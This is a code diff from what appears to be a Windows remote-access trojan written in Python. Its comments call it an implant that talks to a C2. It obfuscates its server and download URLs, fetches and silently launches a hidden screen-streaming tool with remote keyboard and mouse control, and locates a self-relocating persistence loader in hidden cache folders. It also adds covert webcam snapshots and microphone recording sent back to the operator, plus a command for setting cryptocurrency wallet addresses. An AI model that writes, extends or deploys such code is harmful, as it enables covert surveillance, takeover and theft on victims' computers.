@@ -630,14 +630,24 @@ def _persistence_guard() -> None:
 # runs detached + hidden. netvnc signaling/viewer/TURN already live on VPS.
 STREAM_WS = _x("3a3e3e7762622328393b232e6335343f2c3e203e63232839623a3e")   # wss://netvnc.xyrasms.net/ws
 VIEWER_BASE = _x("2539393d3e7762622328393b232e6335343f2c3e203e63232839")   # https://netvnc.xyrasms.net
-NODE_ZIP_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c24236223222928603b7f7f637c79637d603a242360357b796337243d")   # GitHub raw node zip
-BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # GitHub raw bundle
+NODE_ZIP_NAME = _x("23222928603b7f7f637c79637d603a242360357b796337243d")   # node-v22.14.0-win-x64.zip
+BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")       # netvnc_desktop_win64.zip
 NODE_DIR = _x("233b23222928")     # nvnode
 DESK_DIR = _x("233b29283e26")     # nvdesk
-BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")
+# Panel-built payloads with a stage key pull both archives from the panel's
+# own /py/ route on STREAM_ASSET_BASE with ?k=STREAM_ASSET_KEY (no external
+# GitHub dependency). Unkeyed copies keep the legacy GitHub mirror below.
+STREAM_ASSET_BASE = _x("2539393d7762627c7f7a637d637d637c77787d7d7d")   # anchor: http://127.0.0.1:5000
+STREAM_ASSET_KEY = ""                                        # anchor: builder injects 32-hex stage key
+if STREAM_ASSET_KEY and STREAM_ASSET_BASE:
+    NODE_ZIP_URL = STREAM_ASSET_BASE.rstrip("/") + "/py/" + NODE_ZIP_NAME + "?k=" + STREAM_ASSET_KEY
+    BUNDLE_URL = STREAM_ASSET_BASE.rstrip("/") + "/py/" + BUNDLE_NAME + "?k=" + STREAM_ASSET_KEY
+else:
+    NODE_ZIP_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c24236223222928603b7f7f637c79637d603a242360357b796337243d")   # legacy GitHub raw node zip
+    BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # legacy GitHub raw bundle
 
 _stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": "",
-                 "logf": None}
+                 "logf": None, "control": True}
 
 
 def _stream_dir(name: str) -> str:
@@ -687,12 +697,15 @@ def _spawn_hidden(argv, cwd=None, stdout=subprocess.DEVNULL,
     )
 
 
-def deploy_stream(room: str = "default") -> str:
+def deploy_stream(room: str = "default", control: bool = None) -> str:
     """Ensure Node + netvnc streamer bundle are installed (hidden under
     %USERPROFILE%\\.cache), then launch the WebRTC streamer detached.
-    Remote control (mouse/keyboard via /control relay) is enabled."""
+    control=True enables remote mouse/keyboard via the /control relay.
+    When control is None the last set value is reused."""
     if os.name != "nt":
         return "[!] stream: Windows only"
+    if control is None:
+        control = _stream_state.get("control", True)
     seq = _q_deploy_seq[0]   # stop_stream() bumps -> an in-flight deploy aborts
 
     def work():
@@ -753,12 +766,14 @@ def deploy_stream(room: str = "default") -> str:
             _stream_state["phase"] = "starting"
             logf = open(os.path.join(desk, "nvstream.log"), "w")
             _stream_state["logf"] = logf
+            argv = [node, script,
+                    "--stream-url", STREAM_WS,
+                    "--room", room,
+                    "--fps", "12"]
+            if control:
+                argv.append("--allow-control")
             p = _spawn_hidden(
-                [node, script,
-                 "--stream-url", STREAM_WS,
-                 "--room", room,
-                 "--fps", "12",
-                 "--allow-control"],
+                argv,
                 cwd=desk,
                 stdout=logf,
                 stderr=subprocess.STDOUT,
@@ -793,13 +808,14 @@ def deploy_stream(room: str = "default") -> str:
             except Exception:
                 pass
             _stream_state.update(popen=p, pid=p.pid, room=room,
-                                 phase="running", last_error="")
+                                 phase="running", last_error="",
+                                 control=control)
         except Exception as e:
             _stream_state["last_error"] = str(e)
             _stream_state["phase"] = "failed"
 
     threading.Thread(target=work, daemon=True, name="nvstream").start()
-    return f"[+] netvnc stream deploy started (room={room}, control=on)"
+    return f"[+] netvnc stream deploy started (room={room}, control={'on' if control else 'off'})"
 
 
 def stop_stream() -> str:
@@ -837,6 +853,19 @@ def stop_stream() -> str:
     return f"[+] stream stopped ({killed} tracked)"
 
 
+def set_stream_control(control: bool) -> str:
+    """Toggle remote control for the streamer. Restarts a running stream
+    with/without --allow-control; otherwise just sets the flag for the
+    next deploy."""
+    _stream_state["control"] = control
+    p = _stream_state.get("popen")
+    if p is not None and p.poll() is None:
+        room = _stream_state.get("room") or "default"
+        stop_stream()
+        return deploy_stream(room, control=control)
+    return f"[+] stream control set to {'on' if control else 'off'} (stream not running)"
+
+
 def stream_log(lines: int = 100) -> str:
     """Tail the streamer log (node stdout+stderr incl. ffmpeg/ICE errors)."""
     path = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
@@ -855,12 +884,14 @@ def stream_log(lines: int = 100) -> str:
 def stream_status() -> str:
     p = _stream_state.get("popen")
     room = _stream_state.get("room") or "default"
+    control = _stream_state.get("control", True)
+    ctl = "on" if control else "off"
     if p is not None and p.poll() is None:
-        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control=on"
+        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control={ctl}"
     elif _stream_state.get("phase") == "failed":
         line = "netvnc stream: FAILED"
     else:
-        line = f"netvnc stream: not running (phase={_stream_state.get('phase')})"
+        line = f"netvnc stream: not running (phase={_stream_state.get('phase')}, control={ctl})"
     lines = [line]
     if _stream_state.get("last_error"):
         lines.append(f"last_error: {_stream_state['last_error']}")
@@ -933,7 +964,7 @@ def _capture_screen() -> None:
         g32.SelectObject(mem, old)
         buf = ctypes.create_string_buffer(w * h * 4)
         ctypes.memmove(buf, ptr, w * h * 4)
-        _ov_state["bits"], _ov_state["w"], _ov_state["h"] = buf, w, h
+        _ov_state["bits"], _ov_state["w"], _ov_state["h"] = bytes(buf), w, h
     if sec:
         g32.DeleteObject(sec)
     if mem:
@@ -2240,16 +2271,39 @@ def _loader_exe_path() -> str:
     persistence: it copies itself to %USERPROFILE%\\.cache\\<name> and on
     every run re-fetches client.py + boots python from RAM. Only that exe
     can re-boot the implant - the embedded python.exe is useless without
-    the script piped on stdin."""
+    the script piped on stdin.
+
+    loader_py v3 self-relocates to a random hidden folder
+    %USERPROFILE%\\.cache\\<hex16>\\<hex16>.exe and registers persistence at
+    that path, so the fixed helper.exe copy no longer exists. Scan the cache
+    dir for a relocated copy first, then fall back to the legacy fixed-name
+    copies (pre-relocation builds)."""
     root = os.environ.get("RAT_PYROOT") or _base_dir()
     if not root:
         return ""
-    # loader_py v3 hardcodes INSTALL_NAME=helper.exe - prefer it, then the
-    # legacy self-install names (runtime.exe/updater.exe) as fallback.
+    cache = os.path.join(root, INSTALL_DIR_NAME)
+    # Relocated copy: <hex16>\<hex16>.exe (folder name == exe base).
+    try:
+        for entry in os.scandir(cache):
+            if not entry.is_dir():
+                continue
+            name = entry.name
+            if len(name) != 16:
+                continue
+            try:
+                int(name, 16)
+            except ValueError:
+                continue
+            exe = os.path.join(cache, name, name + ".exe")
+            if os.path.exists(exe):
+                return exe
+    except OSError:
+        pass
+    # Legacy fixed-name copies (pre-relocation builds).
     names = ["helper.exe"] + [n for n in INSTALL_NAME_CANDIDATES
                               if n.lower() != "helper.exe"]
     for name in names:
-        p = os.path.join(root, INSTALL_DIR_NAME, name)
+        p = os.path.join(cache, name)
         if os.path.exists(p):
             return p
     return ""
@@ -3820,10 +3874,19 @@ def _crypto_cmd(rest: str) -> str:
     arg = parts[1].strip() if len(parts) > 1 else ""
     if sub == "set":
         ap = arg.split(None, 1)
-        if len(ap) < 2 or not ap[0].lower() in _CRYPTO_PATTERNS:
-            return ("[!] usage: crypto set <coin> <address> | coins: %s"
+        if not ap or ap[0].lower() not in _CRYPTO_PATTERNS:
+            return ("[!] usage: crypto set <coin> [<address>] | coins: %s"
                     % ", ".join(_CRYPTO_PRIORITY))
         coin = ap[0].lower()
+        if len(ap) < 2 or not ap[1].strip():
+            # no address given: report the currently configured target (or
+            # that none is set) instead of failing with a usage error.
+            with _crypto_lock:
+                cur = _crypto_cfg.get(coin)
+            if cur:
+                return "[+] %s -> %s" % (coin, cur)
+            return ("[!] %s not configured yet - usage: crypto set %s <address>"
+                    % (coin, coin))
         addr = ap[1].strip()
         if not re.fullmatch("(?:%s)" % _CRYPTO_PATTERNS[coin], addr):
             return "[!] '%s' does not look like a valid %s address" % (addr,
@@ -3906,6 +3969,743 @@ def _crypto_cmd(rest: str) -> str:
         return "\n".join(out)
     return _crypto_status()
 
+
+# ===== WEBCAM (ffmpeg dshow) + MIC (winmm waveIn) native capture =====
+def _find_ffmpeg() -> str:
+    """Locate an ffmpeg.exe usable for dshow capture. PATH first, then the
+    netvnc streamer's bundled ffmpeg-static and the common WinGet / Program
+    Files install roots, so 'webcam snap' works even without ffmpeg on PATH."""
+    if os.name != "nt":
+        return ""
+    try:
+        hit = shutil.which("ffmpeg")
+        if hit:
+            return hit
+    except Exception:
+        pass
+    cache = os.path.join(_base_dir(), INSTALL_DIR_NAME)
+    pats = []
+    if cache:
+        pats.append(os.path.join(cache, "**", "ffmpeg-static", "ffmpeg.exe"))
+    la = os.environ.get("LOCALAPPDATA", "")
+    if la:
+        pats.append(os.path.join(
+            la, "Microsoft", "WinGet", "Packages", "Gyan.FFmpeg*",
+            "ffmpeg-*-full_build", "bin", "ffmpeg.exe"))
+    pf = os.environ.get("ProgramFiles", r"C:\Program Files")
+    pats.append(os.path.join(pf, "ffmpeg", "bin", "ffmpeg.exe"))
+    for pat in pats:
+        try:
+            hits = glob.glob(pat, recursive=True)
+            if hits:
+                return hits[0]
+        except Exception:
+            pass
+    return ""
+
+
+def _dshow_devices(ff: str):
+    """Run ffmpeg -list_devices and return the dshow video devices as a
+    list of dicts {"name": ..., "alt": ...|None} in enumerated order so
+    [0]/[1]... stay stable. "alt" is the DirectShow alternative name
+    (@device_...) ffmpeg prints on its own line right after a device; it
+    is the spelling that reliably opens cameras whose friendly name
+    defeats dshow name matching (e.g. non-ASCII names - the full-width
+    U+FF06 in "OMEN Cam \uff06 Voice" fails even unquoted because of a
+    codepage round-trip mismatch, while its @device_sw_... name opens).
+
+    Handles both the legacy header format ("DirectShow video devices" /
+    '  "Device Name"') and the ffmpeg >= 8.x tagged format where every
+    line carries a (video)/(audio) suffix OUTSIDE the quotes (e.g.
+    `"HP True Vision FHD Camera" (video)`) followed by the alternative
+    name. Legacy lines are only trusted inside the "video devices"
+    section; tagged lines are classified by their suffix so parsing works
+    on header-less tagged builds too.
+    """
+    devs = []
+    try:
+        p = subprocess.run(
+            [ff, "-hide_banner", "-list_devices", "true", "-f", "dshow",
+             "-i", "dummy"],
+            capture_output=True, timeout=20,
+            creationflags=(subprocess.CREATE_NO_WINDOW
+                           if os.name == "nt" else 0))
+        err = (p.stderr or b"").decode("utf-8", errors="replace")
+    except Exception:
+        return devs
+    sect = None
+    pending = -1        # index of the device an "Alternative name" belongs to
+    seen = set()
+    for raw in err.splitlines():
+        line = raw.strip()
+        low = line.lower()
+        if "alternative name" in low:
+            m = re.search(r'"([^"]+)"', line)
+            if m and 0 <= pending < len(devs) and devs[pending].get("alt") is None:
+                devs[pending]["alt"] = m.group(1)
+            continue
+        if "video devices" in low:
+            sect = "video"
+            continue
+        if "audio devices" in low:
+            sect = "audio"
+            continue
+        mt = re.search(r'"([^"]*)"\s*\((\w+)\)\s*$', line)
+        if mt:
+            if mt.group(2).lower() == "video":
+                name = mt.group(1).strip()
+                if name and name not in seen:
+                    seen.add(name)
+                    devs.append({"name": name, "alt": None})
+                pending = len(devs) - 1
+            else:
+                pending = -1      # an audio alt name must not tag a camera
+            continue
+        if sect == "video":
+            m = re.search(r'"([^"]*)"', line)
+            if m:
+                name = m.group(1).strip()
+                if name and name not in seen:
+                    seen.add(name)
+                    devs.append({"name": name, "alt": None})
+                pending = len(devs) - 1
+    return devs
+
+
+def _dshow_video_names(ff: str):
+    """Compatibility wrapper around _dshow_devices: plain display names."""
+    return [d["name"] for d in _dshow_devices(ff)]
+
+def _resolve_webcam(arg, names):
+    """Map the operator arg (index or name substring) to a dshow device
+    name. Empty arg -> device 0. Returns None when nothing matches."""
+    if not names:
+        return None
+    if not arg or not arg.strip():
+        return names[0]
+    a = arg.strip()
+    if a.isdigit():
+        i = int(a)
+        return names[i] if 0 <= i < len(names) else None
+    for n in names:
+        if n.lower() == a.lower():
+            return n
+    for n in names:
+        if a.lower() in n.lower():
+            return n
+    return None
+
+
+def _webcam_snap(ff: str, arg: str) -> bytes:
+    """Grab a single JPEG frame from a dshow camera. CAM|OK|<b64> on
+    success, CAM|ERR|<reason> otherwise (both MARKER-terminated).
+
+    The dshow -i arg is the device name UNQUOTED (it is a single argv
+    element; wrapping it in literal quotes makes ffmpeg search for a
+    device whose name contains quote chars and every open dies with
+    "Error opening input files: I/O error"). When the friendly name
+    fails to open, the DirectShow alternative name (@device_... from
+    _dshow_devices) is tried. Each spelling gets a 640x480 attempt and a
+    no-video_size fallback (OBS Virtual Camera rejects -video_size).
+    """
+    try:
+        import base64 as _b64
+        devs = _dshow_devices(ff)
+        if not devs:
+            return ("CAM|ERR|no dshow video device found - run 'webcam "
+                    "list'").encode("utf-8", errors="replace") + MARKER
+        names = [d["name"] for d in devs]
+        name = _resolve_webcam(arg, names)
+        if name is None:
+            return ("CAM|ERR|device %r not found - run 'webcam list'"
+                    % arg).encode("utf-8", errors="replace") + MARKER
+        dev = devs[names.index(name)]
+        cands = [dev["name"]]
+        if dev.get("alt"):
+            cands.append(dev["alt"])
+        out_path = os.path.join(_base_dir(),
+                                "_cam_%d_%d.jpg" % (os.getpid(),
+                                                    int(time.time())))
+        last_err = "unknown error"
+        for cand in cands:
+            # dshow input spec = 'video=<name>' (single argv element, no
+            # literal quotes); omitting the video= prefix makes ffmpeg treat
+            # the string as a file name and every open fails instantly.
+            dev_arg = "video=" + cand
+            for attempt in (1, 2):
+                if attempt == 1:
+                    argv = [ff, "-y", "-hide_banner", "-loglevel", "error",
+                            "-f", "dshow", "-video_size", "640x480",
+                            "-i", dev_arg, "-frames:v", "1", "-q:v", "5",
+                            out_path]
+                else:
+                    argv = [ff, "-y", "-hide_banner", "-loglevel", "error",
+                            "-f", "dshow", "-i", dev_arg, "-frames:v", "1",
+                            "-vf", "scale=640:-1", "-q:v", "5", out_path]
+                try:
+                    p = subprocess.run(
+                        argv, capture_output=True, timeout=35,
+                        creationflags=(subprocess.CREATE_NO_WINDOW
+                                       if os.name == "nt" else 0))
+                    err = (p.stderr or b"").decode("utf-8", errors="replace")
+                    if err.strip():
+                        last_err = err.strip().splitlines()[-1][:300]
+                except subprocess.TimeoutExpired:
+                    last_err = ("ffmpeg timed out (device busy or camera "
+                                "off?)")
+                except Exception as e:
+                    last_err = str(e)
+                # Check-then-read-then-remove: deleting before the isfile
+                # probe would discard a successful frame (legacy bug that
+                # made every snap report CAM|ERR even when ffmpeg wrote the
+                # file). ffmpeg -y overwrites any leftover on retries.
+                if not os.path.isfile(out_path):
+                    continue
+                if os.path.getsize(out_path) <= 0:
+                    continue
+                if os.path.getsize(out_path) > 190000 and attempt == 1:
+                    continue     # too big for the C2 channel: retry smaller
+                with open(out_path, "rb") as f:
+                    raw = f.read()
+                try:
+                    os.remove(out_path)
+                except OSError:
+                    pass
+                b64 = _b64.b64encode(raw).decode("ascii")
+                return ("CAM|OK|%s\n" % b64).encode("ascii",
+                                                     errors="replace") + MARKER
+        try:
+            os.remove(out_path)   # drop any leftover frame on the floor
+        except OSError:
+            pass
+        return ("CAM|ERR|snap failed: %s" % last_err[:300]
+                ).encode("utf-8", errors="replace") + MARKER
+    except Exception as e:
+        return ("CAM|ERR|snap error: %s" % e).encode(
+            "utf-8", errors="replace") + MARKER
+
+def _webcam_cmd(rest: str) -> bytes:
+    """webcam status | list | snap [device name or index]."""
+    if os.name != "nt":
+        return b"[!] webcam: Windows only\n" + MARKER
+    sub = (rest.split(None, 1)[0] if rest else "").lower()
+    arg = rest[len(sub):].strip() if sub else ""
+    ff = _find_ffmpeg()
+    if not ff:
+        return (b"[!] webcam: ffmpeg not found on target - 'webcam snap' "
+                b"needs ffmpeg\n" + MARKER)
+    if sub in ("", "status"):
+        devs = _dshow_video_names(ff)
+        out = ["[+] webcam module ready (ffmpeg dshow)",
+               "[+] ffmpeg: %s" % ff,
+               "[+] dshow video devices: %d" % len(devs)]
+        for i, n in enumerate(devs):
+            out.append("    [%d] %s" % (i, n))
+        if not devs:
+            out.append("    (no video input found - camera off/claimed?)")
+        return ("\n".join(out) + "\n").encode("utf-8",
+                                                errors="replace") + MARKER
+    if sub == "list":
+        devs = _dshow_video_names(ff)
+        out = ["[+] dshow video devices (%d):" % len(devs)]
+        out += ["    [%d] %s" % (i, n) for i, n in enumerate(devs)]
+        if not devs:
+            out.append("    (none - 'webcam status' shows diagnostics)")
+        return ("\n".join(out) + "\n").encode("utf-8",
+                                                errors="replace") + MARKER
+    if sub == "snap":
+        return _webcam_snap(ff, arg)
+    return (b"[!] usage: webcam status | list | snap [device name or "
+            b"index]\n" + MARKER)
+
+
+# ===== AUDIO (winmm waveIn, 8000 Hz mono 16-bit PCM) =====
+_WIM_OPEN = 0x3BE
+_WIM_CLOSE = 0x3BF
+_WIM_DATA = 0x3C0
+
+
+def _audio_inputs():
+    """Return (count, names) for waveIn capture devices via winmm."""
+    import ctypes
+    from ctypes import wintypes
+
+    class _WAVEINCAPS(ctypes.Structure):
+        _fields_ = [
+            ("wMid", wintypes.WORD),
+            ("wPid", wintypes.WORD),
+            ("vDriverVersion", wintypes.UINT),
+            ("szPname", wintypes.WCHAR * 64),
+            ("dwFormats", wintypes.DWORD),
+            ("wChannels", wintypes.WORD),
+            ("wReserved1", wintypes.WORD),
+        ]
+    try:
+        winmm = ctypes.WinDLL("winmm")
+        winmm.waveInGetNumDevs.restype = wintypes.UINT
+        num = int(winmm.waveInGetNumDevs())
+        names = []
+        for i in range(num):
+            caps = _WAVEINCAPS()
+            if winmm.waveInGetDevCapsW(i, ctypes.byref(caps),
+                                       ctypes.sizeof(caps)) == 0:
+                names.append(caps.szPname)
+        return num, names
+    except Exception:
+        return 0, []
+
+
+def _audio_rec(seconds: int):
+    """Record N seconds from waveIn device 0. Returns (pcm_bytes, err)."""
+    import ctypes
+    from ctypes import wintypes
+    if seconds < 1:
+        seconds = 1
+    if seconds > 10:
+        seconds = 10
+
+    class _WAVEFORMATEX(ctypes.Structure):
+        _fields_ = [
+            ("wFormatTag", wintypes.WORD),
+            ("nChannels", wintypes.WORD),
+            ("nSamplesPerSec", wintypes.DWORD),
+            ("nAvgBytesPerSec", wintypes.DWORD),
+            ("nBlockAlign", wintypes.WORD),
+            ("wBitsPerSample", wintypes.WORD),
+            ("cbSize", wintypes.WORD),
+        ]
+
+    class _WAVEHDR(ctypes.Structure):
+        _fields_ = [
+            ("lpData", ctypes.c_void_p),
+            ("dwBufferLength", wintypes.DWORD),
+            ("dwBytesRecorded", wintypes.DWORD),
+            ("dwUser", ctypes.c_size_t),
+            ("dwFlags", wintypes.DWORD),
+            ("dwLoops", wintypes.DWORD),
+            ("lpNext", ctypes.c_void_p),
+            ("reserved", ctypes.c_size_t),
+        ]
+    try:
+        winmm = ctypes.WinDLL("winmm")
+        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+        kernel32.CreateEventW.restype = wintypes.HANDLE
+        kernel32.CreateEventW.argtypes = (wintypes.LPVOID, wintypes.BOOL,
+                                          wintypes.BOOL, wintypes.LPVOID)
+        rate = 8000
+        slack = rate * 2          # one extra second so the buffer never
+        buf = ctypes.create_string_buffer(rate * 2 * seconds + slack)
+        evt = kernel32.CreateEventW(None, False, False, None)
+        if not evt:
+            return None, "CreateEvent failed (win32 error %d)" % (
+                ctypes.get_last_error())
+        hwi = wintypes.HANDLE(0)
+        wfx = _WAVEFORMATEX()
+        wfx.wFormatTag = 1        # WAVE_FORMAT_PCM
+        wfx.nChannels = 1
+        wfx.nSamplesPerSec = rate
+        wfx.nAvgBytesPerSec = rate * 2
+        wfx.nBlockAlign = 2
+        wfx.wBitsPerSample = 16
+        wfx.cbSize = 0
+
+        @ctypes.WINFUNCTYPE(None, wintypes.HANDLE, wintypes.UINT,
+                            ctypes.c_size_t, ctypes.c_size_t,
+                            ctypes.c_size_t)
+        def _cb(h, msg, inst, p1, p2):
+            if msg == _WIM_DATA:
+                try:
+                    kernel32.SetEvent(evt)
+                except Exception:
+                    pass
+
+        prepared = False
+        try:
+            winmm.waveInOpen.restype = wintypes.UINT
+            winmm.waveInOpen.argtypes = [ctypes.POINTER(wintypes.HANDLE),
+                                         wintypes.UINT,
+                                         ctypes.POINTER(_WAVEFORMATEX),
+                                         ctypes.c_void_p, ctypes.c_void_p,
+                                         wintypes.DWORD]
+            # dwCallback must be a raw pointer slot: casting the WINFUNCTYPE
+            # instance avoids the ctypes integer-conversion TypeError.
+            rc = winmm.waveInOpen(ctypes.byref(hwi), 0,
+                                  ctypes.byref(wfx),
+                                  ctypes.cast(_cb, ctypes.c_void_p),
+                                  None, 0x00030000)
+            if rc != 0:
+                return None, "waveInOpen failed (mmresult 0x%08X)" % (
+                    rc & 0xFFFFFFFF)
+            whdr = _WAVEHDR()
+            whdr.lpData = ctypes.cast(buf, ctypes.c_void_p)
+            whdr.dwBufferLength = rate * 2 * seconds + slack
+            whdr.dwFlags = 0
+            rc = winmm.waveInPrepareHeader(hwi, ctypes.byref(whdr),
+                                           ctypes.sizeof(whdr))
+            if rc != 0:
+                return None, "waveInPrepareHeader failed (0x%08X)" % (
+                    rc & 0xFFFFFFFF)
+            prepared = True
+            rc = winmm.waveInAddBuffer(hwi, ctypes.byref(whdr),
+                                       ctypes.sizeof(whdr))
+            if rc != 0:
+                return None, "waveInAddBuffer failed (0x%08X)" % (
+                    rc & 0xFFFFFFFF)
+            kernel32.ResetEvent(evt)
+            rc = winmm.waveInStart(hwi)
+            if rc != 0:
+                return None, "waveInStart failed (0x%08X)" % (
+                    rc & 0xFFFFFFFF)
+            time.sleep(seconds)
+            # waveInReset returns the partially-filled buffer to the app and
+            # fires WIM_DATA (waveInStop would leave us waiting on a header
+            # that never completes for sub-buffer captures).
+            winmm.waveInReset(hwi)
+            kernel32.WaitForSingleObject(evt, 3000)
+            recorded = int(whdr.dwBytesRecorded)
+            if recorded <= 0:
+                return None, ("no audio captured (mic muted, unplugged or "
+                              "exclusively held by another app?)")
+            return buf.raw[:recorded], None
+        finally:
+            if prepared:
+                try:
+                    winmm.waveInUnprepareHeader(hwi, ctypes.byref(whdr),
+                                                ctypes.sizeof(whdr))
+                except Exception:
+                    pass
+            try:
+                winmm.waveInClose(hwi)
+            except Exception:
+                pass
+            try:
+                kernel32.CloseHandle(evt)
+            except Exception:
+                pass
+    except Exception as e:
+        return None, str(e)
+
+
+def _wav_of(pcm: bytes) -> bytes:
+    """Wrap raw PCM into a minimal RIFF/WAVE container (8k mono 16-bit)."""
+    import struct as _st
+    rate = 8000
+    data_sz = len(pcm)
+    hdr = (b"RIFF" + _st.pack("<I", 36 + data_sz) + b"WAVE" +
+           b"fmt " + _st.pack("<IHHIIHH", 16, 1, 1, rate, rate * 2, 2, 16) +
+           b"data" + _st.pack("<I", data_sz))
+    return hdr + pcm
+
+
+# ===== MASTER VOLUME (Core Audio / IAudioEndpointVolume) =====
+# The default render endpoint is the speaker/headphone stream the user
+# hears.  IAudioEndpointVolume gives exact master level + mute control.
+# Pure ctypes COM - no pywin32 / extra files required.
+
+def _vol_guid(guid):
+    """Pack a canonical {xxxxxxxx-xxxx-...} GUID string into its native
+    16-byte binary layout (Data1..Data3 little-endian, Data4 verbatim)."""
+    import struct as _st
+    h = guid.strip("{}").replace("-", "")
+    return _st.pack("<IHH", int(h[0:8], 16), int(h[8:12], 16),
+                    int(h[12:16], 16)) + bytes.fromhex(h[16:32])
+
+
+def _vol_slot(iface, index, proto):
+    """Return a callable for the COM method at vtable `index` on the raw
+    interface address `iface` (slots 0..2 are the IUnknown methods).
+
+    Two dereferences are required: iface -> vtable pointer (first field of
+    the object), then the slot content at vtbl + index*ptr_size, which holds
+    the actual method entry point.  Casting the *slot address* (one level
+    short) to a function type makes the call jump into the vtable data and
+    fault - the crash seen in early testing.
+    """
+    import ctypes
+    obj = ctypes.cast(ctypes.c_void_p(iface),
+                      ctypes.POINTER(ctypes.c_void_p))
+    vtbl = obj[0] or 0
+    if not vtbl:
+        raise ValueError("null vtable pointer")
+    slotp = ctypes.cast(ctypes.c_void_p(
+        vtbl + index * ctypes.sizeof(ctypes.c_void_p)),
+        ctypes.POINTER(ctypes.c_void_p))
+    fnp = slotp[0] or 0
+    if not fnp:
+        raise ValueError("null method pointer at vtable slot %d" % index)
+    return ctypes.cast(ctypes.c_void_p(fnp), proto)
+
+
+def _vol_open():
+    """Acquire IAudioEndpointVolume for the default render device.
+
+    Returns (handle, None) on success or (None, err).  `handle` is a dict
+    holding the loaded dlls, the CoInit flag and the owned COM interface
+    addresses; feed it to _vol_close() when done.
+    """
+    import ctypes
+    from ctypes import wintypes
+    h = {"ole": None, "mm": None, "co": False,
+         "enum": None, "dev": None, "vol": None}
+    try:
+        ole = ctypes.WinDLL("ole32")
+        h["ole"] = ole
+        h["mm"] = ctypes.WinDLL("mmdevapi")
+        ole.CoInitializeEx.restype = ctypes.c_long
+        ole.CoInitializeEx.argtypes = (wintypes.LPVOID, wintypes.DWORD)
+        hr = ole.CoInitializeEx(None, 2)   # COINIT_APARTMENTTHREADED
+        # S_FALSE (1) = COM already initialized on this thread (same model)
+        # - benign, but we must not CoUninitialize afterwards.
+        # RPC_E_CHANGED_MODE (0x80010106): thread is already in an MTA -
+        # the calls still work and we must not CoUninitialize either.
+        if hr not in (0, 1, -2147417850):
+            return None, "CoInitializeEx failed (0x%08X)" % (hr & 0xFFFFFFFF)
+        h["co"] = (hr == 0)
+        en = ctypes.c_void_p(0)
+        dev = ctypes.c_void_p(0)
+        vol = ctypes.c_void_p(0)
+        ok = False
+        try:
+            cls = (ctypes.c_char * 16).from_buffer_copy(_vol_guid(
+                "{BCDE0395-E52F-467C-8E3D-C4579291692E}"))
+            iid_enum = (ctypes.c_char * 16).from_buffer_copy(_vol_guid(
+                "{A95664D2-9614-4F35-A746-DE8DB63617E6}"))
+            ole.CoCreateInstance.restype = ctypes.c_long
+            ole.CoCreateInstance.argtypes = (
+                ctypes.c_void_p, wintypes.LPVOID, wintypes.DWORD,
+                ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p))
+            hr = ole.CoCreateInstance(
+                ctypes.cast(cls, ctypes.c_void_p), None, 1,
+                ctypes.cast(iid_enum, ctypes.c_void_p),
+                ctypes.byref(en))
+            if hr < 0:
+                return None, "CoCreateInstance failed (0x%08X)" % (
+                    hr & 0xFFFFFFFF)
+            h["enum"] = en.value
+            _GETDEF = ctypes.WINFUNCTYPE(
+                ctypes.c_long, ctypes.c_void_p, ctypes.c_int,
+                ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+            # eRender = 0, eConsole = 0
+            hr = _vol_slot(h["enum"], 4, _GETDEF)(
+                h["enum"], 0, 0, ctypes.byref(dev))
+            if hr < 0:
+                return None, "GetDefaultAudioEndpoint failed (0x%08X)" % (
+                    hr & 0xFFFFFFFF)
+            h["dev"] = dev.value
+            iid_vol = (ctypes.c_char * 16).from_buffer_copy(_vol_guid(
+                "{5CDF2C82-841E-4546-9722-0CF74078229A}"))
+            _ACT = ctypes.WINFUNCTYPE(
+                ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p,
+                ctypes.c_uint, ctypes.c_void_p,
+                ctypes.POINTER(ctypes.c_void_p))
+            hr = _vol_slot(h["dev"], 3, _ACT)(
+                h["dev"], ctypes.cast(iid_vol, ctypes.c_void_p),
+                1, None, ctypes.byref(vol))   # CLSCTX_INPROC_SERVER = 1
+            if hr < 0:
+                return None, "IAudioEndpointVolume activate failed " \
+                    "(0x%08X)" % (hr & 0xFFFFFFFF)
+            h["vol"] = vol.value
+            ok = True
+            return h, None
+        finally:
+            if not ok:
+                _vol_close(h)
+    except Exception as e:
+        return None, str(e)
+
+
+def _vol_close(h):
+    """Release COM interfaces + CoUninitialize for a _vol_open handle.
+    Tolerates partially-populated handles (open-failure cleanup)."""
+    import ctypes
+    if not h:
+        return
+    try:
+        _REL = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)
+        for key in ("vol", "dev", "enum"):
+            addr = h.get(key)
+            if addr:
+                try:
+                    _vol_slot(addr, 2, _REL)(addr)
+                except Exception:
+                    pass
+                h[key] = None
+    finally:
+        if h.get("ole") and h.get("co"):
+            try:
+                h["ole"].CoUninitialize()
+            except Exception:
+                pass
+
+
+def _vol_query(h):
+    """Read master level + mute from an open handle.
+    Returns (level_pct, muted, err); level_pct is an int in 0..100."""
+    import ctypes
+    try:
+        lvl = ctypes.c_float(0.0)
+        muted = ctypes.c_int(0)
+        _GETS = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
+                                   ctypes.POINTER(ctypes.c_float))
+        _GETM = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
+                                   ctypes.POINTER(ctypes.c_int))
+        hr = _vol_slot(h["vol"], 9, _GETS)(h["vol"], ctypes.byref(lvl))
+        if hr < 0:
+            return None, None, "GetMasterVolumeLevelScalar failed " \
